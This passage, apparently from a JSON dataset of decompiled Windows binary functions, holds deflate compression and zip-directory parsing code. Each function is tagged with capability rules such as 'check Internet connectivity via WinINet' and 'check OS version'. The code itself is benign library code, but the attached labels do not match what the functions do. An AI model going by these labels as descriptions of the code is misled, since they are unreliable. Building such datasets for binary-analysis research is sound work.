pcStack96;\n                    param_1[0xe] = pcStack88;\n                    iVar11 = fcn.00415abf();\n                    if (iVar11 != 0) break;\n                    puStack80 = param_1[0xf];\n                    pcVar18 = param_1[10];\n                    pcStack96 = param_1[0xb];\n                    pcStack88 = param_1[0xe];\ncode_r0x004196f6:\n                    do {\n                        if (pcStack104 < 0x4) {\n                            while (pcStack104 != NULL) {\n                                puStack80 = puStack80 + 1;\n                                cVar1 = *(param_1 + 0x24 + pcStack76);\n                                *pcVar18 = cVar1;\n                                *pcStack96 = *pcStack96 >> 1;\n                                pcStack88 = pcStack88 + -1;\n                                pcVar9 = pcVar18 + 1;\n                                if (pcStack88 == NULL) {\n                                    pcVar9 = pcVar18 + 2;\n                                    pcStack88 = 0x8;\n                                    pcStack96 = pcVar18 + 1;\n                                }\n                                pcStack100 = pcStack100 + 1;\n                                piVar10 = param_1 + cVar1 * 2 + 0x8192;\n                                *piVar10 = *piVar10 + 1;\n                                pcStack92 = pcStack92 + 1;\n                                if (0x8000 < pcStack100) {\n                                    pcStack100 = 0x8000;\n                                }\n                                pcStack104 = pcStack104 + -1;\n                                pcStack76 = pcStack76 + 1 & 0x7fff;\n                                pcVar18 = pcVar9;\n                                if (pcStack60 < pcVar9) {\n                                    param_1[10] = pcVar9;\n                                    param_1[7] = pcStack92;\n                                    param_1[8] = pcStack104;\n                                    param_1[9] = pcStack100;\n                                    param_1[0xf] = puStack80;\n                                    param_1[0xb] = pcStack96;\n                                    param_1[0xe] = pcStack88;\n                                    iVar11 = fcn.00415abf();\n                                    if (iVar11 != 0) goto joined_r0x0041a35b;\n                                    puStack80 = param_1[0xf];\n                                    pcVar18 = param_1[10];\n                                    pcStack96 = param_1[0xb];\n                                    pcStack88 = param_1[0xe];\n                                }\n                            }\ncode_r0x0041961a:\n                            uVar12 = param_1[0x22];\n                            if ((uVar12 != 0) || ((param_1[0x20] != 0 && (pcStack104 != NULL)))) {\n                                pcStack84 = pcStack92 + pcStack104;\n                                uVar7 = 0x1000U - pcStack104;\n                                if (uVar12 < 0x1000U - pcStack104) {\n                                    uVar7 = uVar12;\n                                }\n                                pcStack104 = pcStack104 + uVar7;\n                                param_1[0x22] = uVar12 - uVar7;\n                                for (; pcStack84 = pcStack84 & 0x7fff,  uVar7 != 0; uVar7 = uVar7 - uVar12) {\n                                    uVar12 = 0x8000U - pcStack84;\n                                    if (uVar7 < 0x8000U - pcStack84) {\n                                        uVar12 = uVar7;\n                                    }\n                                    puVar19 = param_1[0x21];\n                                    puVar22 = piStack72 + pcStack84;\n                                    for (uVar8 = uVar12; uVar8 != 0; uVar8 = uVar8 - 1) {\n                                        *puVar22 = *puVar19;\n                                        puVar19 = puVar19 + 1;\n                                        puVar22 = puVar22 + 1;\n                                    }\n                                    if (pcStack84 < 0x101) {\n                                        uVar8 = 0x101U - pcStack84;\n                                        if (uVar12 < 0x101U - pcStack84) {\n                                            uVar8 = uVar12;\n                                        }\n                                        puVar19 = param_1[0x21];\n                                        puVar22 = piStack72 + pcStack84 + 0x8000U;\n                                        for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n                                            *puVar22 = *puVar19;\n                                            puVar19 = puVar19 + 1;\n                                            puVar22 = puVar22 + 1;\n                                        }\n                                    }\n                                    param_1[0x21] = param_1[0x21] + uVar12;\n                                    pcStack84 = pcStack84 + uVar12;\n                                }\n                                if (0x8000 - pcStack104 < pcStack100) {\n                                    pcStack100 = 0x8000 - pcStack104;\n                                }\n                                if ((param_1[0x20] != 0) || (0xfff < pcStack104)) goto code_r0x004196f6;\n                            }\n                            param_1[10] = pcVar18;\n                            param_1[7] = pcStack92;\n                            param_1[8] = pcStack104;\n                            param_1[9] = pcStack100;\n                            param_1[0xf] = puStack80;\n                            param_1[0xb] = pcStack96;\n                            param_1[0xe] = pcStack88;\n                            goto code_r0x0041a387;\n                        }\n                        puVar23 = piStack72 + pcStack76;\n                        uVar12 = *puVar23;\n                        uVar7 = uVar12 & 0xffffff;\n                        uVar8 = (uVar7 >> 0x11 ^ uVar7) & 0xfff;\n                        uVar3 = *(param_1 + uVar8 * 2 + 0x29272);\n                        *(param_1 + uVar8 * 2 + 0x29272) = pcStack92;\n                        uVar6 = pcStack92 - uVar3;\n                        pcVar9 = uVar6;\n                        if (pcStack100 < pcVar9) {\ncode_r0x004198a5:\n                            pcStack84._0_1_ = SUB41(uVar7, 0);\n                            pcVar13 = pcVar18 + 1;\n                            pcVar17 = 0x1;\n                            *pcVar18 = pcStack84._0_1_;\n                            *pcStack96 = *pcStack96 >> 1;\n                            piVar10 = param_1 + (uVar12 & 0xff) * 2 + 0x8192;\n                            *piVar10 = *piVar10 + 1;\n                        }\n                        else {\n                            uVar8 = uVar3 & 0x7fff;\n                            piVar10 = piStack72 + uVar8;\n                            if (uVar7 != (*(piStack72 + uVar8 + 2) << 0x10 | *(piStack72 + uVar8 + 1) << 8 | *piVar10))\n                            goto code_r0x004198a5;\n                            iVar11 = 0x20;\n                            puVar15 = puVar23;\n                            while( true ) {\n                                if (*(puVar15 + 2) != piVar10[1]) {\n                                    puVar15 = puVar15 + 2;\n                                    piVar10 = piVar10 + 1;\n                                    goto code_r0x004197ce;\n                                }\n                                if (*(puVar15 + 1) != piVar10[2]) break;\n                                if (*(puVar15 + 6) != piVar10[3]) {\n                                    puVar15 = puVar15 + 6;\n                                    piVar10 = piVar10 + 3;\n                                    goto code_r0x004197ce;\n                                }\n                                piVar10 = piVar10 + 4;\n                                puVar15 = puVar15 + 2;\n                                if ((*puVar15 != *piVar10) || (iVar11 = iVar11 + -1,  iVar11 == 0))\n                                goto code_r0x004197ce;\n                            }\n                            puVar15 = puVar15 + 1;\n                            piVar10 = piVar10 + 2;\ncode_r0x004197ce:\n                            if (iVar11 != 0) {\n                                pcVar13 = puVar15 + ((*puVar15 == *piVar10) - puVar23);\n                                if (0x2 < pcVar13) goto code_r0x004197fd;\n                                goto code_r0x004198a5;\n                            }\n                            if (pcVar9 == NULL) goto code_r0x004198a5;\n                            pcVar13 = 0x102;\ncode_r0x004197fd:\n                            if ((pcVar13 == 0x3) && (0x1fff < pcVar9)) goto code_r0x004198a5;\n                            pcVar17 = pcStack104;\n                            if (pcVar13 < pcStack104) {\n                                pcVar17 = pcVar13;\n                            }\n                            if (uVar6 - 1 < 0) {\n                                uVar27 = 0xd6a;\n                                pcVar26 = \n                                \"(cur_match_len >= TDEFL_MIN_MATCH_LEN) && (cur_match_dist >= 1) && (cur_match_dist <= TDEFL_LZ_DICT_SIZE)\"\n                                ;\n                                goto code_r0x00419926;\n                            }\n                            pcVar13 = pcVar18 + 3;\n                            *pcVar18 = pcVar17 - 3;\n                            pcVar9 = pcVar9 + -1;\n                            *(pcVar18 + 1) = pcVar9;\n                            uVar2 = *((pcVar9 >> 8) + 0x424ec0);\n                            *pcStack96 = *pcStack96 >> 1 | 0x80;\n                            uVar5 = *((pcVar9 & 0x1ff) + 0x425140);\n                            if (0x1ff < pcVar9) {\n                                uVar5 = uVar2;\n                            }\n                            piVar10 = param_1 + uVar5 * 2 + 0x83d2;\n                            *piVar10 = *piVar10 + 1;\n                            piVar10 = param_1 + *(pcVar17 * 2 + 0x42543a) * 2 + 0x8192;\n                            *piVar10 = *piVar10 + 1;\n                        }\n                        pcStack88 = pcStack88 + -1;\n                        pcVar18 = pcVar13;\n                        if (pcStack88 == NULL) {\n                            pcStack88 = 0x8;\n                            pcVar18 = pcVar13 + 1;\n                            pcStack96 = pcVar13;\n                        }\n                        pcStack100 = pcStack100 + pcVar17;\n                        puStack80 = puStack80 + pcVar17;\n                        pcStack92 = pcStack92 + pcVar17;\n                        if (0x8000 < pcStack100) {\n                            pcStack100 = 0x8000;\n                        }\n                        pcStack76 = pcStack76 + pcVar17 & 0x7fff;\n                        if (pcStack104 < pcVar17) {\n                            uVar27 = 0xd89;\n                            pcVar26 = \"lookahead_size >= cur_match_len\";\n                            goto code_r0x00419926;\n                        }\n                        pcStack104 = pcStack104 + -pcVar17;\n                    } while (pcVar18 <= pcStack60);\n                }\njoined_r0x0041a35b:\n                if (-1 < iVar11) {\ncode_r0x0041a387:\n                    if (((param_1[2] & 0x3000U) != 0) && (param_2 != NULL)) {\n                        iVar11 = fcn.00417106(param_1[6], param_2, param_1[0x21] - param_2);\n                        param_1[6] = iVar11;\n                    }\n                    if ((((param_6 != 0) && (param_1[8] == 0)) && (param_1[0x22] == 0)) && (param_1[0x17] == 0)) {\n                        iVar11 = fcn.00415abf();\n                        if (iVar11 < 0) goto code_r0x0041a3f5;\n                        param_1[0x18] = param_6 == 4;\n                        if (param_6 == 3) {\n                            puVar25 = param_1 + 0x29272;\n                            for (iVar11 = 0x4000; iVar11 != 0; iVar11 = iVar11 + -1) {\n                                *puVar25 = 0;\n                                puVar25 = puVar25 + 1;\n                            }\n                            puVar25 = param_1 + 0x19272;\n                            for (iVar11 = 0x4000; iVar11 != 0; iVar11 = iVar11 + -1) {\n                                *puVar25 = 0;\n                                puVar25 = puVar25 + 1;\n                            }\n                            param_1[9] = 0;\n                        }\n                    }\ncode_r0x0041a435:\n                    iVar11 = fcn.00414e59();\n                    param_1[0x1b] = iVar11;\n                    return iVar11;\n                }\ncode_r0x0041a3f5:\n                return param_1[0x1b];\n            }\n            if ((pcStack76 == NULL) || ((uVar12 & 0x80000) != 0)) goto code_r0x0041a4af;\n            for (pcVar13 = NULL;\n                (pcStack104 = pcVar9,  pcVar9 != pcVar13 &&\n                (pcStack104 = pcVar13, \n                *(param_1 + (pcStack88 + -1 & 0x7fff) + 0x90) == pcVar13[param_1 + pcStack88 + 0x90]));\n                pcVar13 = pcVar13 + 1) {\n            }\n            if (pcStack104 < 0x3) {\n                pcVar17 = NULL;\n                pcVar13 = NULL;\n            }\n            else {\n                pcVar17 = 0x1;\n                pcStack96 = pcStack104;\n                pcVar13 = pcStack104;\n            }\n            goto code_r0x00419fcd;\n        }\n        if (param_3 != NULL) goto code_r0x0041954e;\n    }\n    else {\n        if (param_3 != NULL) goto code_r0x0041954e;\ncode_r0x00419554:\n        if (param_5 == NULL) goto code_r0x0041955e;\n    }\n    *param_5 = 0;\ncode_r0x0041955e:\n    param_1[0x1b] = -2;\n    return -2;\ncode_r0x00419f01:\n    pcStack100 = pcStack100 & 0x7fff;\n    if (pcStack60 == CONCAT11((pcVar21 + pcStack100)[param_1 + 0x91], *(param_1 + 0x24 + pcVar21 + pcStack100))) {\ncode_r0x00419f30:\n        if (pcStack84 == NULL) goto code_r0x00419fb6;\n        piVar24 = pcStack100 + param_1 + 0x24;\n        piVar20 = piVar10;\n        if (*piVar10 == *piVar24) {\n            while (piVar20[1] == piVar24[1]) {\n                if (piVar20[2] != piVar24[2]) {\n                    piVar20 = piVar20 + 2;\n                    piVar24 = piVar24 + 2;\n                    goto code_r0x0041a454;\n                }\n                if (piVar20[3] != piVar24[3]) {\n                    piVar20 = piVar20 + 3;\n                    piVar24 = piVar24 + 3;\n                    goto code_r0x0041a454;\n                }\n                piVar24 = piVar24 + 4;\n                piVar20 = piVar20 + 4;\n                if (*piVar20 != *piVar24) goto code_r0x0041a454;\n                if (piVar10 + 0x80 == piVar20) {\n                    pcVar13 = pcVar9;\n                    pcVar17 = pcStack84;\n                    if (0x102 < pcVar9) {\n                        pcVar13 = 0x102;\n                    }\n                    goto code_r0x00419fb6;\n                }\n            }\n            piVar20 = piVar20 + 1;\n            piVar24 = piVar24 + 1;\ncode_r0x0041a454:\n            pcVar21 = piVar20 + ((*piVar20 == *piVar24) - piVar10);\n            if (pcStack96 < pcVar21) {\n                pcVar13 = pcVar9;\n                if (pcVar21 < pcVar9) {\n                    pcVar13 = pcVar21;\n                }\n                pcVar17 = pcStack84;\n                if (pcVar9 == pcVar13) goto code_r0x00419fb6;\n                uStack44 = CONCAT11(*(param_1 + pcVar14 + pcVar13 + 0x91), *(param_1 + 0x24 + pcVar14 + pcVar13));\n                pcStack96 = pcVar13;\n            }\n        }\n    }\n    goto code_r0x00419df9;\ncode_r0x00419fb6:\n    if ((pcVar17 < 0x2000) || (pcVar13 != 0x3)) {\ncode_r0x00419fcd:\n        if ((pcStack88 == pcVar17) || (((uVar12 & 0x20000) != 0 && (pcVar13 < 0x6)))) goto code_r0x0041a10c;\n        if (pcStack92 != NULL) {\n            if (pcVar13 <= pcStack92) goto code_r0x0041a117;\n            puVar19 = param_1[10];\n            uVar12 = param_1[0x15];\n            param_1[0xf] = param_1[0xf] + 1;\n            param_1[10] = puVar19 + 1;\n            *puVar19 = uVar12;\n            *param_1[0xb] = *param_1[0xb] >> 1;\n            if (param_1[0xe] + -1 == 0) {\n                param_1[0xe] = 8;\n                param_1[0xb] = param_1[10];\n                param_1[10] = param_1[10] + 1;\n            }\n            else {\n                param_1[0xe] = param_1[0xe] + -1;\n            }\n            piVar10 = param_1 + (uVar12 & 0xff) * 2 + 0x8192;\n            *piVar10 = *piVar10 + 1;\n            if (pcVar13 < pe_nt_image_headers32) {\n                cVar1 = *(param_1 + 0x24 + pcStack88);\n                goto code_r0x0041a2e6;\n            }\n            pcVar17 = pcVar17 + 0xffffffff;\n            if (0x7fff < pcVar17) goto code_r0x0041a052;\n            param_1[0xf] = param_1[0xf] + pcVar13;\n            *param_1[10] = pcVar13 + -3;\n            *(param_1[10] + 1) = pcVar17;\n            *(param_1[10] + 2) = pcVar17 >> 8;\n            param_1[10] = param_1[10] + 3;\n            *param_1[0xb] = *param_1[0xb] >> 1 | 0x80;\n            if (param_1[0xe] + -1 == 0) {\n                param_1[0xe] = 8;\n                param_1[0xb] = param_1[10];\n                param_1[10] = param_1[10] + 1;\n            }\n            else {\n                param_1[0xe] = param_1[0xe] + -1;\n            }\n            uVar2 = *((pcVar17 & 0x1ff) + 0x425140);\n            if (0x1ff < pcVar17) {\n                uVar2 = *((pcVar17 >> 8) + 0x424ec0);\n            }\n            uVar3 = *(pcVar13 * 2 + 0x42543a);\n            piVar10 = param_1 + uVar2 * 2 + 0x83d2;\n            *piVar10 = *piVar10 + 1;\n            piVar10 = param_1 + uVar3 * 2 + 0x8192;\n            *piVar10 = *piVar10 + 1;\n            goto code_r0x0041a1c7;\n        }\n        if (pcVar17 == NULL) goto code_r0x0041a1d7;\n        if (((param_1[5] != 0) || ((uVar12 & 0x10000) != 0)) || (pe_nt_image_headers32 <= pcVar13)) {\n            if ((0x8000 < pcVar17) || (pcVar13 < 0x3)) goto code_r0x0041a052;\n            param_1[0xf] = param_1[0xf] + pcVar13;\n            *param_1[10] = pcVar13 + -3;\n            pcVar17 = pcVar17 + 0xffffffff;\n            *(param_1[10] + 1) = pcVar17;\n            *(param_1[10] + 2) = pcVar17 >> 8;\n            param_1[10] = param_1[10] + 3;\n            *param_1[0xb] = *param_1[0xb] >> 1 | 0x80;\n            if (param_1[0xe] + -1 == 0) {\n                param_1[0xe] = 8;\n                param_1[0xb] = param_1[10];\n                param_1[10] = param_1[10] + 1;\n            }\n            else {\n                param_1[0xe] = param_1[0xe] + -1;\n            }\n            uVar2 = *((pcVar17 & 0x1ff) + 0x425140);\n            if (0x1ff < pcVar17) {\n                uVar2 = *((pcVar17 >> 8) + 0x424ec0);\n            }\n            uVar3 = *(pcVar13 * 2 + 0x42543a);\n            piVar10 = param_1 + uVar2 * 2 + 0x83d2;\n            *piVar10 = *piVar10 + 1;\n            piVar10 = param_1 + uVar3 * 2 + 0x8192;\n            *piVar10 = *piVar10 + 1;\n            goto code_r0x0041a2f4;\n        }\n        cVar1 = *(param_1 + 0x24 + pcStack88);\ncode_r0x0041a2e6:\n        param_1[0x15] = cVar1;\n        param_1[0x13] = pcVar17;\n        param_1[0x14] = pcVar13;\n    }\n    else {\ncode_r0x0041a10c:\n        if (pcStack92 != NULL) {\ncode_r0x0041a117:\n            uVar12 = param_1[0x13] - 1;\n            if ((pcStack92 < 0x3) || (0x7fff < uVar12)) {\ncode_r0x0041a052:\n                uVar27 = 0xddf;\n                pcVar26 = \n                \"(match_len >= TDEFL_MIN_MATCH_LEN) && (match_dist >= 1) && (match_dist <= TDEFL_LZ_DICT_SIZE)\";\n                goto code_r0x00419926;\n            }\n            param_1[0xf] = param_1[0xf] + pcStack92;\n            *param_1[10] = pcStack92 + -3;\n            *(param_1[10] + 1) = uVar12;\n            *(param_1[10] + 2) = uVar12 >> 8;\n            param_1[10] = param_1[10] + 3;\n            *param_1[0xb] = *param_1[0xb] >> 1 | 0x80;\n            if (param_1[0xe] + -1 == 0) {\n                param_1[0xe] = 8;\n                param_1[0xb] = param_1[10];\n                param_1[10] = param_1[10] + 1;\n            }\n            else {\n                param_1[0xe] = param_1[0xe] + -1;\n            }\n            uVar2 = *((uVar12 & 0x1ff) + 0x425140);\n            if (0x1ff < uVar12) {\n                uVar2 = *((uVar12 >> 8) + 0x424ec0);\n            }\n            piVar10 = param_1 + uVar2 * 2 + 0x83d2;\n            *piVar10 = *piVar10 + 1;\n            piVar10 = param_1 + *(pcStack92 * 2 + 0x42543a) * 2 + 0x8192;\n            *piVar10 = *piVar10 + 1;\n            pcVar13 = param_1[0x14] + -1;\ncode_r0x0041a1c7:\n            param_1[0x14] = 0;\n            goto code_r0x0041a2f4;\n        }\ncode_r0x0041a1d7:\n        pcVar9 = param_1[10];\n        cVar1 = *(param_1 + 0x24 + pcStack88);\n        param_1[0xf] = param_1[0xf] + 1;\n        param_1[10] = pcVar9 + 1;\n        *pcVar9 = cVar1;\n        *param_1[0xb] = *param_1[0xb] >> 1;\n        if (param_1[0xe] + -1 == 0) {\n            param_1[0xe] = 8;\n            param_1[0xb] = param_1[10];\n            param_1[10] = param_1[10] + 1;\n        }\n        else {\n            param_1[0xe] = param_1[0xe] + -1;\n        }\n        piVar10 = param_1 + cVar1 * 2 + 0x8192;\n        *piVar10 = *piVar10 + 1;\n    }\n    pcVar13 = 0x1;\ncode_r0x0041a2f4:\n    param_1[7] = param_1[7] + pcVar13;\n    if (param_1[8] < pcVar13) {\n        uVar27 = 0xe70;\n        pcVar26 = \"d->m_lookahead_size >= len_to_move\";\n        goto code_r0x00419926;\n    }\n    param_1[9] = param_1[9] + pcVar13;\n    uVar12 = param_1[9];\n    param_1[8] = param_1[8] - pcVar13;\n    if (0x8000 < uVar12) {\n        uVar12 = 0x8000;\n    }\n    param_1[9] = uVar12;\n    if ((param_1[10] <= param_1 + 0x1926aU) &&\n       ((param_1[0xf] < 0x7c01 ||\n        (((param_1[10] - (param_1 + 0x9272)) * 0x73 >> 7 < param_1[0xf] && ((*(param_1 + 10) & 8) == 0))))))\n    goto code_r0x00419ae1;\n    param_1[0x22] = pcVar18;\n    param_1[0x21] = puStack80;\n    iVar11 = fcn.00415abf();\n    if (iVar11 == 0) goto code_r0x00419ae1;\n    goto joined_r0x0041a35b;\n}\n",
        "token_count": 9180
    },
    "0041a5f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041a5f0(int32_t *param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    if (*param_1 == 0) {\n        param_1 = sub.msvcrt.dll__assert(\"d->m_pPut_buf_func\", 0x424620, 0xee6);\n    }\n    fcn.00419463(param_1, param_2, &param_3, 0, 0, param_4);\n    return;\n}\n",
        "token_count": 114
    },
    "0041a99e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.0041a99e(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    iVar3 = 6;\n    if ((-1 < param_1) && (iVar3 = param_1,  10 < param_1)) {\n        iVar3 = 10;\n    }\n    uVar1 = *(iVar3 * 4 + 0x424a60);\n    uVar2 = (3 < param_1) - 1 & 0x4000 | uVar1;\n    if (0 < param_2) {\n        uVar2 = uVar1 & 0xffff0000 | CONCAT11(uVar2 >> 8, uVar1) | 0x1000;\n    }\n    if (param_1 == 0) {\n        uVar2 = uVar2 | 0x80000;\n    }\n    else if (param_3 == 1) {\n        uVar2 = uVar2 | 0x20000;\n    }\n    else if (param_3 == 2) {\n        uVar2 = uVar2 & 0xfffff000;\n    }\n    else if (param_3 == 4) {\n        uVar2 = uVar2 | 0x40000;\n    }\n    else if (param_3 == 3) {\n        uVar2 = uVar2 | 0x10000;\n    }\n    return uVar2;\n}\n",
        "token_count": 345
    },
    "0041b06a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041b06a(uint noname_0, uint32_t noname_1, uint32_t *noname_2, uint noname_3, uint noname_4, uint noname_5, \n            uint noname_6, uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, \n            uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, \n            uint noname_31, uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, \n            uint noname_37, uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, \n            uint noname_43, uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, \n            uint noname_49, uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, \n            uint noname_55, uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, \n            uint noname_61, uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, \n            uint noname_67, uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, \n            uint noname_73, uint noname_74, uint noname_75, uint noname_76, uint noname_77, uint arg_140h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint32_t *puVar10;\n    uint var_4h;\n    int32_t var_8h;\n    uint var_14h;\n    uint var_18h;\n    uint var_1ch;\n    uint var_20h;\n    uint var_24h;\n    uint var_28h;\n    uint var_30h;\n    uint var_34h;\n    uint var_38h;\n    uint32_t auStack64 [4];\n    int32_t iStack48;\n    int32_t iStack44;\n    uint uStack32;\n    \n    iVar8 = 0;\n    if ((((var_8h != 0) && (piVar3 = *(var_8h + 0x48),  piVar3 != NULL)) && (noname_1 < *(var_8h + 0x10))) &&\n       (*(var_8h + 0x14) == 1)) {\n        iVar8 = *(piVar3[4] + noname_1 * 4) + *piVar3;\n    }\n    if ((iVar8 == 0) || (noname_2 == NULL)) {\n        uVar4 = 0;\n    }\n    else {\n        iVar5 = *(var_8h + 0x48);\n        *noname_2 = noname_1;\n        noname_2[1] = *(*(iVar5 + 0x10) + noname_1 * 4);\n        *(noname_2 + 2) = *(iVar8 + 4);\n        *(noname_2 + 10) = *(iVar8 + 6);\n        *(noname_2 + 3) = *(iVar8 + 8);\n        *(noname_2 + 0xe) = *(iVar8 + 10);\n        uVar1 = *(iVar8 + 0xe);\n        uVar7 = *(iVar8 + 0xc);\n        puVar10 = auStack64;\n        for (iVar5 = 9; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        uStack32 = 0xffffffff;\n        iStack44 = (uVar1 >> 9) + 0x50;\n        iStack48 = (uVar1 >> 5 & 0xfU) - 1;\n        auStack64[3] = uVar1 & 0x1f;\n        auStack64[2] = uVar7 >> 0xb;\n        auStack64[0] = uVar7 * 2 & 0x3e;\n        auStack64[1] = uVar7 >> 5 & 0x3f;\n        uVar7 = sub.msvcrt.dll_mktime(auStack64);\n        noname_2[4] = uVar7;\n        noname_2[5] = *(iVar8 + 0x10);\n        uVar7 = *(iVar8 + 0x14);\n        noname_2[7] = 0;\n        noname_2[6] = uVar7;\n        uVar7 = *(iVar8 + 0x18);\n        noname_2[9] = 0;\n        noname_2[8] = uVar7;\n        *(noname_2 + 10) = *(iVar8 + 0x24);\n        noname_2[0xb] = *(iVar8 + 0x26);\n        uVar7 = *(iVar8 + 0x2a);\n        noname_2[0xd] = 0;\n        noname_2[0xc] = uVar7;\n        uVar7 = *(iVar8 + 0x1c);\n        if (0x103 < uVar7) {\n            uVar7 = 0x103;\n        }\n        puVar9 = iVar8 + 0x2e;\n        puVar10 = noname_2 + 0xf;\n        for (uVar6 = uVar7; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(noname_2 + uVar7 + 0x3c) = 0;\n        uVar7 = *(iVar8 + 0x20);\n        if (0xff < uVar7) {\n            uVar7 = 0xff;\n        }\n        uVar1 = *(iVar8 + 0x1e);\n        uVar2 = *(iVar8 + 0x1c);\n        noname_2[0xe] = uVar7;\n        puVar9 = uVar2 + 0x2e + uVar1 + iVar8;\n        puVar10 = noname_2 + 0x50;\n        for (uVar6 = uVar7; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(noname_2 + uVar7 + 0x140) = 0;\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1763
    },
    "0041b6f9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0041b6f9(int32_t param_1, uint8_t *param_2, char *param_3, uint32_t param_4)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint8_t *puVar15;\n    uint32_t uStack56;\n    int32_t iStack52;\n    int32_t iStack48;\n    char *pcStack44;\n    \n    if (((param_1 != 0) && (piVar3 = *(param_1 + 0x48),  param_2 != NULL)) && (piVar3 != NULL)) {\n        if (*(param_1 + 0x14) != 1) {\n            return -1;\n        }\n        if ((((param_4 & 0x300) == 0) && (param_3 == NULL)) && (piVar3[9] != 0)) {\n            uVar8 = 0xffffffff;\n            puVar6 = param_2;\n            do {\n                if (uVar8 == 0) break;\n                uVar8 = uVar8 - 1;\n                uVar11 = *puVar6;\n                puVar6 = puVar6 + 1;\n            } while ((piVar3 == NULL) != uVar11);\n            uVar8 = ~uVar8 - 1;\n            iVar13 = 0;\n            iStack52 = *(param_1 + 0x10) + -1;\n            while (iVar13 <= iStack52) {\n                iVar4 = iStack52 + iVar13 >> 1;\n                iVar14 = *(piVar3[8] + iVar4 * 4);\n                iVar5 = *(piVar3[4] + iVar14 * 4) + *piVar3;\n                uVar12 = *(iVar5 + 0x1c);\n                puVar6 = iVar5 + 0x2e;\n                uVar9 = uVar8;\n                if (uVar12 < uVar8) {\n                    uVar9 = uVar12;\n                }\n                puVar1 = puVar6 + uVar9;\n                uVar11 = 0;\n                puVar15 = param_2;\n                for (; uVar7 = uVar11,  puVar6 < puVar1; puVar6 = puVar6 + 1) {\n                    uVar11 = *puVar6;\n                    if (uVar11 + 0xbf < 0x1a) {\n                        uVar11 = uVar11 + 0x20;\n                    }\n                    uVar7 = *puVar15;\n                    if (uVar7 + 0xbf < 0x1a) {\n                        uVar7 = uVar7 + 0x20;\n                    }\n                    if (uVar11 != uVar7) break;\n                    puVar15 = puVar15 + 1;\n                }\n                if (puVar1 == puVar6) {\n                    iVar5 = uVar12 - uVar8;\n                }\n                else {\n                    iVar5 = uVar11 - uVar7;\n                }\n                if (iVar5 == 0) {\n                    return iVar14;\n                }\n                if (iVar5 < 0) {\n                    iVar13 = iVar4 + 1;\n                }\n                else {\n                    iStack52 = iVar4 + -1;\n                }\n            }\n        }\n        else {\n            uVar8 = 0xffffffff;\n            puVar6 = param_2;\n            do {\n                if (uVar8 == 0) break;\n                uVar8 = uVar8 - 1;\n                uVar11 = *puVar6;\n                puVar6 = puVar6 + 1;\n            } while (uVar11 != 0);\n            uVar8 = ~uVar8 - 1;\n            if (0xffff < uVar8) {\n                return -1;\n            }\n            if (param_3 == NULL) {\n                uStack56 = 0;\n            }\n            else {\n                uVar9 = 0xffffffff;\n                pcVar10 = param_3;\n                do {\n                    if (uVar9 == 0) break;\n                    uVar9 = uVar9 - 1;\n                    cVar2 = *pcVar10;\n                    pcVar10 = pcVar10 + 1;\n                } while (cVar2 != '\\0');\n                uStack56 = ~uVar9 - 1;\n                if (0xffff < uStack56) {\n                    return -1;\n                }\n            }\n            iVar13 = *(param_1 + 0x10);\n            for (iStack48 = 0; iStack48 != iVar13; iStack48 = iStack48 + 1) {\n                iVar14 = *(piVar3[4] + iStack48 * 4) + *piVar3;\n                uVar9 = *(iVar14 + 0x1c);\n                if (uVar8 <= uVar9) {\n                    pcStack44 = iVar14 + 0x2e;\n                    if (uStack56 != 